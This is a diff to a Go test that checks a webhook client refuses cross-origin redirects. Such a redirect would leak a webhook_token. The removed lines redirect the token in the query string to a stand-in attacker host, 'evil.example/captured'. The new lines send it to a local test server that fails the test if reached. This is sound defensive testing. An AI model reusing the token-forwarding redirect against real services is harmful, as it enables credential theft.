@@ -156,20 +156,23 @@ func TestSameOriginRedirectPolicy(t *testing.T) {
 // ?webhook_token= there.
 func TestCheckWebhookCrossOriginRedirectBlocked(t *testing.T) {
 	t.Parallel()
-	atc := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Query().Get("webhook_token") == "" {
-			http.Error(w, "missing token", http.StatusBadRequest)
-			return
-		}
-		http.Redirect(w, r, "http://evil.example/captured?"+r.URL.RawQuery,
-			http.StatusFound)
-	}))
-	defer atc.Close()
+	// The redirect target is a LIVE server (evil.URL), not just a
+	// hostname: if the client ever follows it, the handler below
+	// fails the test and the credentials land on a real listener.
 	evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		t.Errorf("cross-origin redirect followed — webhook_token=%q leaked", r.URL.Query().Get("webhook_token"))
 		w.WriteHeader(http.StatusOK)
 	}))
 	defer evil.Close()
+	atc := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Query().Get("webhook_token") == "" {
+			http.Error(w, "missing token", http.StatusBadRequest)
+			return
+		}
+		http.Redirect(w, r, evil.URL+"/captured?"+r.URL.RawQuery,
+			http.StatusFound)
+	}))
+	defer atc.Close()
 
 	c := &Client{
 		BaseURL:      atc.URL,
